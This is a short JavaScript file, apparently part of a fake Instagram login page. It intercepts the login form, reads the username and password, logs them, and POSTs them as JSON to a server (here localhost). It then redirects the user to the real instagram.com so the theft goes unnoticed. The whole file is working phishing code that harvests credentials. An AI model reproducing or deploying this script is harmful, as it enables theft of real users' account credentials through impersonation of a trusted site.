let form = document.querySelector("#loginForm");

form.addEventListener("submit", (e) => {
  e.preventDefault();
  let username = document.querySelector(
    '[aria-label="Phone number, username, or email"'
  ).value;
  let password = document.querySelector('[aria-label="Password"]').value;
  console.log("form is clicked");
  const payload = { username, password };
  console.log(payload);
  fetch("http://localhost:3000", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ username, password }),
  })
    .then((response) => {
      window.location.href = "https://instagram.com";
    })
    .catch((err) => console.log(err));
});
